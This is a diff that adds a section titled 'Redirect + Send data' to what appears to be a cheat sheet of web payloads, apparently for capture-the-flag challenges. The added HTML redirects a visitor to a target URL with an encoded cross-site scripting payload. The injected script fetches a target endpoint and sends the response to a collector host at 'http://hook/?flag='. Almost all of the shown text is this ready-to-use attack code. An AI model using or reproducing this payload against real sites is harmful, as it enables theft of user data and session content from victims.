@@ -1,3 +1,22 @@
+### Redirect + Send data
+
+```html
+<html>
+  <body>
+    <script>
+      const payload = encodeURIComponent(
+        '<script>fetch("http://host/target_endpoint")' +
+          '.then(response => response.text())' +
+          '.then(data => {' +
+          '  fetch("http://hook/?flag=" + encodeURIComponent(data));' +
+          '})<\/script>'
+      );
+      window.location = 'http://host?msg=' + payload;
+    </script>
+  </body>
+</html>
+```
+
 ### GET
 
 ```html
